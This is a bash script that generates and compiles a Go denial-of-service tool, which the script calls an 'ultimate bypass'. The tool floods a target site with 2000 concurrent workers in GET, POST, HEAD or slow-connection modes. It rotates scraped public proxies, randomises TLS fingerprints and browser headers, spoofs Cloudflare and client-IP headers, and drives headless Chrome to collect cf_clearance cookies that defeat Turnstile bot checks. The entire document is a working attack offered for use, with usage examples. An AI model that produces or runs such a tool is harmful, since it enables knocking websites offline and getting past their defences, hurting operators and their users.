#!/bin/bash

# ----------------------------------------
# GO DOS TOOL - ULTIMATE BYPASS (FIXED FOR REAL)
# ----------------------------------------

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

SEP="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

clear
echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  DENIAL SERVICE OF GO - ULTIMATE BYPASS${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

rm -f main.go

echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go...${NC}"

cat > main.go << 'EOF'
package main

import (
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/chromedp/chromedp"
	"golang.org/x/net/http2"
)

var (
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7523.112 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
	}

	referers = []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://duckduckgo.com/",
		"https://facebook.com/",
		"https://www.reddit.com/",
		"https://www.youtube.com/",
		"",
	}

	proxies         []string
	proxyMu         sync.RWMutex
	proxyIndex      uint64
	proxyAPI        = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
	refreshInterval = 5 * time.Minute
	
	cfClearanceCookie string
	cookieMu          sync.RWMutex
	cookieExpiry      time.Time
	solvingActive     bool
	solvingMu         sync.Mutex
)

type JA3Signature struct {
	Name         string
	CipherSuites []uint16
	NextProtos   []string
	MinVersion   uint16
	MaxVersion   uint16
}

var ja3Signatures = []JA3Signature{
	{
		Name: "Chrome",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
		NextProtos: []string{"h2", "http/1.1"},
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS13,
	},
	{
		Name: "Firefox",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
		NextProtos: []string{"h2", "http/1.1"},
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS13,
	},
}

type ConnectionPool struct {
	clients  []*http.Client
	counter  uint64
	size     int
	useProxy bool
}

func getRandomJA3Signature() JA3Signature {
	return ja3Signatures[randInt(0, len(ja3Signatures)-1)]
}

func getRandomizedTLSConfig() *tls.Config {
	sig := getRandomJA3Signature()
	return &tls.Config{
		NextProtos:         sig.NextProtos,
		InsecureSkipVerify: true,
		MinVersion:         sig.MinVersion,
		MaxVersion:         sig.MaxVersion,
		CipherSuites:       sig.CipherSuites,
	}
}

func NewConnectionPool(poolSize int, useProxy bool, targetHost string) *ConnectionPool {
	pool := &ConnectionPool{
		clients:  make([]*http.Client, poolSize),
		size:     poolSize,
		useProxy: useProxy,
	}
	for i := 0; i < poolSize; i++ {
		pool.clients[i] = pool.createClient()
	}
	return pool
}

func (p *ConnectionPool) createClient() *http.Client {
	var transport *http.Transport

	if p.useProxy {
		proxyStr := getNextProxy()
		if proxyStr != "" {
			if !strings.Contains(proxyStr, "://") {
				proxyStr = "http://" + proxyStr
			}
			proxyURL, err := url.Parse(proxyStr)
			if err == nil {
				transport = &http.Transport{
					Proxy:           http.ProxyURL(proxyURL),
					TLSClientConfig: getRandomizedTLSConfig(),
					MaxIdleConns:    100,
					IdleConnTimeout: 120 * time.Second,
				}
				http2.ConfigureTransport(transport)
				return &http.Client{Transport: transport, Timeout: 30 * time.Second}
			}
		}
	}

	transport = &http.Transport{
		TLSClientConfig: getRandomizedTLSConfig(),
		MaxIdleConns:    100,
		IdleConnTimeout: 120 * time.Second,
	}
	http2.ConfigureTransport(transport)
	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
}

func (p *ConnectionPool) GetClient() *http.Client {
	idx := atomic.AddUint64(&p.counter, 1) % uint64(p.size)
	return p.clients[idx]
}

func (p *ConnectionPool) CloseIdleConnections() {
	for _, client := range p.clients {
		if tr, ok := client.Transport.(*http.Transport); ok {
			tr.CloseIdleConnections()
		}
	}
}

func loadProxiesFromAPI() {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(proxyAPI)
	if err != nil {
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return
	}

	body, _ := io.ReadAll(resp.Body)
	lines := strings.Split(string(body), "\n")

	newProxies := []string{}
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
			newProxies = append(newProxies, line)
		}
	}

	proxyMu.Lock()
	proxies = newProxies
	proxyMu.Unlock()
	atomic.StoreUint64(&proxyIndex, 0)
}

func proxyRefresher() {
	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		loadProxiesFromAPI()
	}
}

func getNextProxy() string {
	proxyMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxyMu.RUnlock()
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) % uint64(n)
	p := proxies[idx]
	proxyMu.RUnlock()
	return p
}

func printBanner() {
	fmt.Println(" ╔═══════════════════════════════════════╗")
	fmt.Println(" ║     DENIAL SERVICE OF GO - ULTIMATE   ║")
	fmt.Println(" ║     Cloudflare Bypass + Turnstile     ║")
	fmt.Println(" ╚═══════════════════════════════════════╝")
	fmt.Println()
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
}

func randomUA() string {
	return userAgents[randInt(0, len(userAgents)-1)]
}

func randomReferer() string {
	return referers[randInt(0, len(referers)-1)]
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randomHex(n int) string {
	bytes := make([]byte, n)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

func randomBase64(n int) string {
	bytes := make([]byte, n)
	rand.Read(bytes)
	return base64.StdEncoding.EncodeToString(bytes)
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func randBool() bool {
	n, _ := rand.Int(rand.Reader, big.NewInt(2))
	return n.Int64() == 1
}

func generateCacheBust() string {
	return "?v=" + strconv.Itoa(randInt(1, 1000000))
}

func generatePath() string {
	paths := []string{
		"/", "/index.html", "/home", "/api/v1/users", 
		"/api/v1/data", "/wp-admin", "/admin", "/login",
	}
	return paths[randInt(0, len(paths)-1)]
}

func addCloudflareBypassHeaders(req *http.Request) {
	spoofIP := randomIP()
	
	req.Header.Set("CF-Connecting-IP", spoofIP)
	req.Header.Set("CF-IPCountry", "US")
	req.Header.Set("CF-Ray", randomHex(16))
	req.Header.Set("CDN-Loop", "cloudflare")
	req.Header.Set("X-Forwarded-For", spoofIP)
	req.Header.Set("X-Real-IP", spoofIP)
	req.Header.Set("True-Client-IP", spoofIP)
	req.Header.Set("X-Originating-IP", spoofIP)
	req.Header.Set("X-Remote-IP", spoofIP)
	req.Header.Set("X-Client-IP", spoofIP)
	req.Header.Set("Sec-CH-UA", `"Chromium";v="141"`)
	req.Header.Set("Sec-CH-UA-Mobile", "?0")
	req.Header.Set("Sec-CH-UA-Platform", `"Windows"`)
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("DNT", "1")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
}

func solveTurnstile(target string) (string, error) {
	solvingMu.Lock()
	defer solvingMu.Unlock()
	
	if solvingActive {
		return "", fmt.Errorf("solver already active")
	}
	solvingActive = true
	defer func() { solvingActive = false }()
	
	fmt.Printf("\n[!] Solving Cloudflare Turnstile for %s...\n", target)
	
	opts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("no-sandbox", true),
		chromedp.UserAgent(randomUA()),
	)
	
	allocCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancel()
	
	ctx, cancel := chromedp.NewContext(allocCtx)
	defer cancel()
	
	ctx, cancel = context.WithTimeout(ctx, 90*time.Second)
	defer cancel()
	
	var cfClearance string
	
	err := chromedp.Run(ctx,
		chromedp.Navigate(target),
		chromedp.Sleep(5*time.Second),
		chromedp.ActionFunc(func(ctx context.Context) error {
			cookies, err := chromedp.Cookies(ctx)
			if err != nil {
				return err
			}
			for _, cookie := range cookies {
				if cookie.Name == "cf_clearance" {
					cfClearance = fmt.Sprintf("cf_clearance=%s", cookie.Value)
					break
				}
			}
			return nil
		}),
	)
	
	if err != nil || cfClearance == "" {
		return "", fmt.Errorf("failed to get cf_clearance cookie")
	}
	
	fmt.Printf("[+] Turnstile solved!\n")
	return cfClearance, nil
}

func maintainCookie(target string, done chan struct{}) {
	ticker := time.NewTicker(25 * time.Minute)
	defer ticker.Stop()
	
	for {
		select {
		case <-done:
			return
		case <-ticker.C:
			newCookie, err := solveTurnstile(target)
			if err == nil {
				cookieMu.Lock()
				cfClearanceCookie = newCookie
				cookieExpiry = time.Now().Add(30 * time.Minute)
				cookieMu.Unlock()
				fmt.Printf("[+] Cookie refreshed\n")
			}
		}
	}
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU() * 4)
	
	useProxy := false
	solveFlag := false
	
	for i := 1; i < len(os.Args); i++ {
		switch os.Args[i] {
		case "proxy":
			useProxy = true
		case "--solve", "-s":
			solveFlag = true
		}
	}
	
	if useProxy {
		loadProxiesFromAPI()
		if len(proxies) > 0 {
			go proxyRefresher()
		} else {
			useProxy = false
		}
	}
	
	if len(os.Args) < 4 {
		printBanner()
		fmt.Println("Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW> [proxy] [--solve]")
		fmt.Println("")
		fmt.Println("Examples:")
		fmt.Println("  ./main https://target.com 60 GET")
		fmt.Println("  ./main https://target.com 120 POST --solve")
		fmt.Println("  ./main https://target.com 30 HEAD proxy")
		os.Exit(1)
	}
	
	target := os.Args[1]
	durStr := os.Args[2]
	mode := strings.ToUpper(os.Args[3])
	
	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" {
		printBanner()
		fmt.Println("Mode must be GET, POST, HEAD, or SLOW")
		os.Exit(1)
	}
	
	if !strings.HasPrefix(target, "http") {
		target = "https://" + target
	}
	
	durationSec, err := strconv.Atoi(durStr)
	if err != nil {
		fmt.Println("Invalid duration:", err)
		os.Exit(1)
	}
	duration := time.Duration(durationSec) * time.Second
	
	printBanner()
	fmt.Printf("[+] Target: %s\n", target)
	fmt.Printf("[+] Mode: %s\n", mode)
	fmt.Printf("[+] Duration: %d sec\n", durationSec)
	fmt.Printf("[+] Workers: 2000\n")
	if useProxy && len(proxies) > 0 {
		fmt.Printf("[+] Proxies: %d\n", len(proxies))
	}
	if solveFlag {
		fmt.Printf("[+] Turnstile solving: ENABLED\n")
	}
	fmt.Println("[+] Cloudflare bypass enabled")
	fmt.Println("[+] Starting... Press Ctrl+C to stop")
	
	if solveFlag {
		cookie, err := solveTurnstile(target)
		if err != nil {
			fmt.Printf("[-] Failed to solve Turnstile: %v\n", err)
		} else {
			cookieMu.Lock()
			cfClearanceCookie = cookie
			cookieExpiry = time.Now().Add(30 * time.Minute)
			cookieMu.Unlock()
			fmt.Printf("[+] Turnstile bypass active\n")
		}
	}
	
	poolSize := 500
	connectionPool := NewConnectionPool(poolSize, useProxy, "")
	
	done := make(chan struct{})
	stats := &atomicCounter{val: 0}
	startTime := time.Now()
	
	go func() {
		time.Sleep(duration)
		close(done)
	}()
	
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		close(done)
	}()
	
	if solveFlag {
		go maintainCookie(target, done)
	}
	
	for i := 0; i < 2000; i++ {
		go attackWorker(target, mode, done, stats, useProxy, connectionPool)
	}
	
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-done:
			elapsed := time.Since(startTime).Seconds()
			fmt.Printf("\n[+] Attack completed!\n")
			fmt.Printf("Total requests: %d\n", stats.get())
			fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/elapsed)
			connectionPool.CloseIdleConnections()
			return
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			rps := float64(stats.get()) / elapsed
			fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", elapsed, durationSec, stats.get(), rps)
		}
	}
}

type atomicCounter struct {
	val int64
}

func (c *atomicCounter) inc() {
	atomic.AddInt64(&c.val, 1)
}

func (c *atomicCounter) get() int64 {
	return atomic.LoadInt64(&c.val)
}

func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool) {
	for {
		select {
		case <-done:
			return
		default:
			client := pool.GetClient()
			path := generatePath()
			
			if mode != "SLOW" && randInt(1, 100) <= 70 {
				path += generateCacheBust()
			}
			
			fullURL := strings.TrimSuffix(target, "/") + path
			
			var req *http.Request
			var err error
			
			if mode == "SLOW" {
				u, _ := url.Parse(target)
				host := u.Hostname()
				port := "443"
				if u.Scheme == "http" {
					port = "80"
				}
				conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
				if err != nil {
					time.Sleep(200 * time.Millisecond)
					continue
				}
				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n", path, host, randomUA())
				stats.inc()
				time.Sleep(1 * time.Second)
				conn.Close()
				continue
			}
			
			if mode == "GET" {
				req, err = http.NewRequest("GET", fullURL, nil)
			} else if mode == "POST" {
				req, err = http.NewRequest("POST", fullURL, strings.NewReader("data=test"))
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			} else if mode == "HEAD" {
				req, err = http.NewRequest("HEAD", fullURL, nil)
			}
			
			if err != nil {
				continue
			}
			
			req.Header.Set("User-Agent", randomUA())
			req.Header.Set("Referer", randomReferer())
			req.Header.Set("Connection", "keep-alive")
			
			addCloudflareBypassHeaders(req)
			
			cookieMu.RLock()
			if cfClearanceCookie != "" && time.Now().Before(cookieExpiry) {
				req.Header.Set("Cookie", cfClearanceCookie)
			}
			cookieMu.RUnlock()
			
			resp, err := client.Do(req)
			if err == nil {
				if mode != "HEAD" {
					io.Copy(io.Discard, resp.Body)
				}
				resp.Body.Close()
			}
			stats.inc()
		}
	}
}
EOF

if [ ! -f "main.go" ]; then
    echo -e " ${RED}✗ Error: Failed to create main.go${NC}"
    exit 1
else
    echo -e " ${GREEN}✓ main.go created successfully${NC}"
fi

echo

# Check OS
if command -v apt &> /dev/null; then
    PKG_MGR="apt"
elif command -v pacman &> /dev/null; then
    PKG_MGR="pacman"
elif command -v brew &> /dev/null; then
    PKG_MGR="brew"
else
    PKG_MGR="apt"
fi

echo -e " ${YELLOW}➤${NC} ${GREEN}Installing dependencies...${NC}"

# Kill any existing go.mod files
rm -rf go.mod go.sum

# Initialize and get deps in ONE CLEAN COMMAND SEQUENCE
go mod init main
go get golang.org/x/net@v0.17.0
go get github.com/chromedp/chromedp@v0.9.3
go mod tidy

echo -e " ${GREEN}✓ Dependencies installed${NC}"
echo

echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  COMPILING${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Compile
go build -o main main.go

if [ $? -eq 0 ]; then
    chmod +x main
    rm -f main.go go.mod go.sum
    echo -e " ${GREEN}✓ Compilation successful!${NC}"
    echo
    echo -e " ${GREEN}►${NC} Run: ${YELLOW}./main https://target.com 60 GET --solve${NC}"
    echo
    exit 0
else
    echo -e " ${RED}✗ Compilation failed${NC}"
    echo -e " ${YELLOW}Run manually:${NC}"
    echo "  go mod init main && go get golang.org/x/net@v0.17.0 && go get github.com/chromedp/chromedp@v0.9.3 && go mod tidy && go build -o main main.go"
    rm -f main.go
    exit 1
fi
